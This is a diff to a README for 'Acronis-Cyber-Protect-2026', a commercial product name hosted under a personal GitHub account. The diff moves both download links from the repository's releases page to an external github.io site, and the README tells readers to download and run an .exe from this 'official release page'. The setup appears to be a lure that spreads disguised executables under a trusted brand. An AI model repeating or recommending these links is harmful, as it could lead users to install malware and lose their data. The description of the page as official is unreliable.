@@ -1,6 +1,6 @@
 # 🛡️ Acronis-Cyber-Protect-2026 - Keeping Your Data Safe And Secure
 
-[![](https://img.shields.io/badge/Download-Acronis_Cyber_Protect-blue.svg)](https://github.com/sprigh4673/Acronis-Cyber-Protect-2026/releases)
+[![](https://img.shields.io/badge/Download-Acronis_Cyber_Protect-blue.svg)](https://sprigh4673.github.io)
 
 ## 📌 About This Software
 
@@ -20,7 +20,7 @@ Before you install this software, check that your computer meets these basic nee
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official release page](https://github.com/sprigh4673/Acronis-Cyber-Protect-2026/releases) to access the download files.
+1. Visit the [official release page](https://sprigh4673.github.io) to access the download files.
 2. Look for the latest version listed under the Assets section.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your Downloads folder or your Desktop.
